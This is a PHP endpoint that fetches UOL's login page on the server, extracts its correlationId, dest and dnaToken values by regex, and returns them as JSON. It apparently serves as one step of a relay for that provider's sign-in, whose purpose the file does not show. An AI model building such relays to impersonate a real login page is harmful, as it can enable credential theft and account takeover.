<?php
declare(strict_types=1);

require __DIR__ . '/includes/security.php';

$config = require __DIR__ . '/config.php';
public_session_start($config);

require_once __DIR__ . '/includes/http_client.php';

header('Content-Type: application/json; charset=utf-8');
header('Cache-Control: no-store, no-cache, must-revalidate');

$origin = rtrim((string) ($config['provider_origin'] ?? 'https://conta.uol.com.br'), '/');
$loginPath = (string) ($config['provider_login_path'] ?? '/login?t=default');
$loginUrl = $origin . $loginPath;

$theme = 'default';
if (preg_match('/[?&]t=([^&]+)/', $loginPath, $m)) {
    $theme = urldecode($m[1]);
}

$resp = api_http_request('GET', $loginUrl, [
    'headers' => [
        'Accept: text/html,application/xhtml+xml',
        'Accept-Language: pt-BR,pt;q=0.9',
    ],
]);

if ($resp === null) {
    http_response_code(502);
    echo json_encode(['ok' => false, 'text' => 'Nao foi possivel contactar o UOL.'], JSON_UNESCAPED_UNICODE);
    exit;
}

$html = (string) ($resp['body'] ?? '');
$correlationId = '';
$dest = '';
$dnaToken = '';

if (preg_match('/"correlationId"\s*:\s*"([^"]+)"/', $html, $cm)) {
    $correlationId = $cm[1];
}
if (preg_match('/"dest"\s*:\s*"([^"]+)"/', $html, $dm)) {
    $dest = $dm[1];
}
if (preg_match('/"dnaToken"\s*:\s*"([^"]+)"/', $html, $tm)) {
    $dnaToken = $tm[1];
}

if ($dest === '' && preg_match('/dest=([^&"\']+)/', $loginPath, $xm)) {
    $dest = urldecode($xm[1]);
}

echo json_encode([
    'ok'            => true,
    'theme'         => $theme,
    'correlationId' => $correlationId,
    'dest'          => $dest,
    'dnaToken'      => $dnaToken,
], JSON_UNESCAPED_UNICODE);
